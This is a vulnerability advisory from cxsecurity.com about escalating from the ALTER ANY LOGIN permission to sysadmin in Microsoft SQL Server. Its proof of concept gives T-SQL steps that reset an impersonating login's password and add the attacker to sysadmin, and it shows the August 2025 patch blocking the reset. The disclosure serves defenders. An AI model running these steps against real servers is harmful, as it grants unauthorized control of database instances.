---
title: MSSQL Database Privilege Elevation From ALTER ANY LOGIN To SYSADMIN
url: https://cxsecurity.com/issue/WLB-2025080019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-21
fetch_date: 2025-10-07T00:12:40.751734
---

# MSSQL Database Privilege Elevation From ALTER ANY LOGIN To SYSADMIN

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MSSQL Database Privilege Elevation From ALTER ANY LOGIN To SYSADMIN** **2025.08.20**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Title: MSSQL Database Privilege Elevation From ALTER ANY LOGIN To SYSADMIN
Product: Microsoft SQL Server
Vendor: Microsoft
Affected Version(s): SQL Server 2016,2017,2019,2022
Tested Version(s): SQL Server 2016,2017,2019,2022
Fixed Build Versions: 16.0.4210.1 , 16.0.1145.1 , 15.0.4440.1, 15.0.2140.1 , 14.0.3500.1 , 14.0.2080.1, 13.0.7060.1 , 13.0.6465.1
Risk Level: Medium
Solution Status: Fixed
CVE Reference: N/A
Author of Advisory: Emad Al-Mousa
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
Privilege escalation/elevation in Microsoft SQL Server database system is possible if a database login is granted the system privilege "ALTER ANY LOGIN", and if any of the existing SQL Server logins is granted the "IMPERSONATE ANY LOGIN" permission directly....then the account with "ALTER ANY LOGIN" permission will be able to reset/change the password of this account. Consequently, the attacker will be able connect using the account with "IMPERSONATE ANY LOGIN" to elevate his/her primary account to SYSADMIN role.
By Design, SQL Server database login with "ALTER ANY LOGIN" permission can't change the passwords for "sa" built-in account, and can't change the password for logins granted “control server” , “sysadmin” , “securityadmin” as protection mechanism against privilege elevation attacks.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
I will create an account called dummy account called “kit” and will grant it ALTER ANY LOGIN permission
USE [master]
GO
CREATE LOGIN [kit] WITH PASSWORD=N'kit123', DEFAULT\_DATABASE=[master], DEFAULT\_LANGUAGE=[us\_english], CHECK\_EXPIRATION=OFF, CHECK\_POLICY=OFF
GO
use [master]
GO
GRANT ALTER ANY LOGIN TO [kit]
GO
I will then access the SQL Server Instance using account “kit” , and will search for any login in the database instance that is granted “impersonate any login permission” for the aim to escalate my permissions.
Will create two accounts that have “impersonate any login” permissions:
USE [master]
GO
CREATE LOGIN [test1] WITH PASSWORD=N'test1', DEFAULT\_DATABASE=[master], CHECK\_EXPIRATION=OFF, CHECK\_POLICY=OFF
GO
grant impersonate any login to [test1]
GO
// control server implicitly has the impersonation permission
USE [master]
GO
CREATE LOGIN [test2] WITH PASSWORD=N'test2', DEFAULT\_DATABASE=[master], CHECK\_EXPIRATION=OFF, CHECK\_POLICY=OFF
GO
grant control server to [test2]
GO
As “kit” login I try to alter/change the password for the two logins test1 & test2:
USE [master]
GO
ALTER LOGIN [test1] WITH PASSWORD=N'emad@2025'
GO
USE [master]
GO
ALTER LOGIN [test2] WITH PASSWORD=N'emad@2025'
GO
So, I was able to change the password only for the login that is explicitly granted “impersonate any login” permission [test1 account], I can’t do that with logins granted “control server” , “sysadmin” , “securityadmin”, or “sa” account as expected and by design.
After, successfully resetting the password for test1 account you can access the SQL Server Instance and escalate “kit” account to sysadmin as shown below:
execute as login='sa'
alter server role [sysadmin] add member [kit]
GO
Now, let me apply the latest Microsoft security update released in August 2025 KB5063756 and simulate it again:
USE [master]
GO
ALTER LOGIN [test1] WITH PASSWORD=N'hot\_summer@2025'
GO
It will be blocked with the error:
Msg 15151, Level 16, State 1, Line 3
Cannot alter the login 'test1', because it does not exist or you do not have permission.

**##### References:**

https://databasesecurityninja.wordpress.com/2025/08/13/sql-server-privilege-elevation-escalation-from-alter-any-login-permission-to-sysadmin-role-fixed-in-august-2025-security-update/

https://support.microsoft.com/en-us/topic/kb5063756-description-of-the-security-update-for-sql-server-2022-gdr-august-12-2025-f56e3677-84b7-4ba3-ab13-b33fcfabb212

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080019)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top